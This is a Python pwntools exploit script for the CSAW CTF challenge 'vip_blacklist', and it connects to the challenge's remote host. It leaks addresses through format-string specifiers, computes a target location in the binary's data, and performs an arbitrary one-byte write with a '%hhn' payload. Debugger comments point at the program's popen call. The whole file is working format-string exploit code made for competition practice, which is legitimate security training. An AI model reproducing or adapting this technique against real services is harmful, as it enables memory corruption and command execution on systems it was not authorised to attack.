#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("vip_blacklist")

host = args.HOST or "vip-blacklist.ctf.csaw.io"
port = int(args.PORT or 9999)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# b *handle_client+176
# b *handle_client+258 -> call sprintf
# b *handle_client+588 -> call popen

gdbscript = """
set follow-fork-mode parent
b *handle_client+588
continue
""".format(
    **locals()
)

rnd_off = 8
cnr_off = 26
whitelist_off = 3
io = start()


def send_data(p: str) -> None:
    io.clean()
    io.sendline(p)


def leak_value(p: str) -> int:
    send_data(p)
    leak = io.recvuntil(b"...")
    leak = int(leak.split(b": ")[-1].split(b"...")[0], 16)
    return leak


def arb_write(where: int, what: int) -> None:
    # send_data(fmtstr_payload(18, {where: what}, write_size="short"))
    send_data(f"%{what}c%13$hhn".ljust(16, " ").encode() + p64(where))


io.clean()
_data = leak_value(f"%{whitelist_off}$p")
_data = _data + 7952
print("[_data]", hex(_data))
# whitelist_addr = leak_value(f"%{whitelist_off}$p")
# whitelist_addr = whitelist_addr + 7968

# print("[whitelist_addr]", hex(whitelist_addr))

arb_write(_data, 0xAB)

# canary = leak_value(f"%{cnr_off}$p")
# rnd_addr = leak_value(f"%{rnd_off}$p")


# print("[random_address]", hex(rnd_addr))
# print("[canary]", hex(canary))

io.interactive()
